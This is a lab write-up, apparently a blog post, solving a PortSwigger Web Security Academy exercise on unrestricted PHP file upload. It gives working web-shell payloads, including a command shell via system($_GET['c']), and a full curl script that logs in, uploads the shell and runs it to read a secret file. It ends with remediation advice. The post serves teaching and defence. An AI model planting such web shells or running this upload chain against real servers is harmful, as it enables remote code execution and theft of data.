---
layout: post
title: "PortSwigger: Remote Code Execution via Web Shell Upload"
date: 2027-10-17 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, FileUpload]
tags: [portswigger, file-upload, web-shell, rce, php, cwe-434]
---

The simplest, most dangerous file-upload bug there is: an avatar uploader that takes whatever you give it, saves it in a folder the web server runs PHP from, and asks no questions. Hand it a `.php` file and the "upload an image" feature quietly becomes "run my code on your server." This is [CWE-434](https://cwe.mitre.org/data/definitions/434.html), Unrestricted Upload of File with Dangerous Type. No bypass tricks required — that's the whole point.

## Overview

After logging in as `wiener:peter`, the **My Account** page has an avatar upload. Upload an ordinary image and it shows up at a predictable path:

```
/files/avatars/<your-filename>
```

Two facts make this fatal when combined:

1. The server saves the file **by its original name with no validation** — extension, MIME type, and contents are all ignored.
2. That directory is served by a **PHP-enabled** web server, so a `.php` file there is *executed*, not downloaded.

Put those together and uploading `exploit.php` then visiting it is the same as running your own script on their machine.

## The web shell

The lab only needs us to read one file (`/home/carlos/secret`), so a **read-only** web shell is cleaner than a full command shell — one bare GET returns the file, no `?cmd=` parameter to fiddle with:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

(If you wanted interactive command execution instead, you'd use `<?php echo system($_GET['c']); ?>` and then request `exploit.php?c=id`.)

## Exploitation

Log in, scrape the avatar form's CSRF token, then upload and trigger:

```bash
U=https://<id>.web-security-academy.net

# 1. log in (carry the session cookie)
csrf=$(curl -sk -c cookies.txt "$U/login" | grep -oP 'name="csrf" value="\K[^"]+')
curl -sk -b cookies.txt -c cookies.txt "$U/login" \
  --data-urlencode "csrf=$csrf" --data-urlencode "username=wiener" --data-urlencode "password=peter"

# 2. build the read-only shell
printf '%s' "<?php echo file_get_contents('/home/carlos/secret'); ?>" > exploit.php

# 3. upload it through the avatar form (csrf + user fields come from /my-account)
acsrf=$(curl -sk -b cookies.txt "$U/my-account?id=wiener" | grep -oP 'name="csrf" value="\K[^"]+')
curl -sk -b cookies.txt "$U/my-account/avatar" \
  -F "csrf=$acsrf" -F "user=wiener" \
  -F 'avatar=@exploit.php;type=application/octet-stream'

# 4. execute it — the response body IS the secret
curl -sk -b cookies.txt "$U/files/avatars/exploit.php"
```

That last request returns the secret straight away. Submitting it solves the lab.

## Why it worked

A file upload is only safe if the server treats the bytes as **inert data**. Here it does the opposite — it treats them as **code in a place that runs code**. There was no extension check to dodge, no magic-byte image header to forge, no `Content-Type` to spoof. Those classic bypasses (`.php.jpg` double extensions, JPEG-magic polyglots, MIME spoofing) only matter when validation actually exists; this server had none, so a plain `.php` walked right in.

## The fix

Break either link in the chain — ideally both:

- **Validate on an allowlist**, checking the extension *and* the real MIME type (never trust the client's `Content-Type` header). Reject anything not on the list.
- **Rename** every upload to a random, server-generated name with a safe extension. Never reuse the user's filename (that also kills path-traversal-via-filename).
- **Store uploads outside the webroot**, or serve them from a directory where the server will not execute scripts (e.g. turn off the PHP handler for `/files/avatars/`).
- For defense in depth, serve user content from a separate sandboxed domain and scan contents.

Any single one of these turns the web shell back into a harmless file that just sits there.
